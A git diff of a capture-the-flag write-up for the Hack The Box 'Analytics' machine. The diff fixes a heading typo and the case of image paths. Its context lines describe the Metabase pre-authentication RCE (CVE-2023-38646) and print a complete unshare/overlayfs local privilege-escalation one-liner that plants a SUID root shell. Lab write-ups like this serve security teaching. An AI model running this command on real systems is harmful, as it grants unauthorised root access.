@@ -61,7 +61,7 @@ The scan reveal *2 open ports* (22 & 80) and we can see its redirecting to the d
 
 ![Alt Text](/assets/images/HTB/Analytics/Analitics1.png)
 
-# FoorHold.
+# FootHold.
 
 ## Finding the exploit.
 I looked only for "metabase Vulnerabilities" and I am able to find an unauthenticated RCE vulnerability (**CVE-2023-38646**). CVE-2023-38646 is a critical vulnerability in Metabase, an open-source business intelligence tool, allowing pre-authentication remote code execution (RCE). This means an attacker can execute arbitrary commands on a Metabase server **without needing valid login credentials**. Exploiting this required extracting the setup token from the API endpoint */api/session/properties* (for more information on this exploit, check this [blog](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646)).
@@ -194,13 +194,13 @@ The exploit involved leveraging unshare to execute a privileged shell.
 unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
 ```
 
-![Alt Text](/assets/images/HTB/Analytics/analytics8.png)
+![Alt Text](/assets/images/HTB/Analytics/Analytics8.png)
 
 After running the executable created, we gained root access to the system:
 ```bash
 whoami
 ```
-![Alt Text](/assets/images/HTB/Analytics/analytics9.png)
+![Alt Text](/assets/images/HTB/Analytics/Analytics9.png)
 
 # Takeaways:
 -	Always start with thorough enumeration, as it uncovers critical entry points like subdomains or API endpoints.
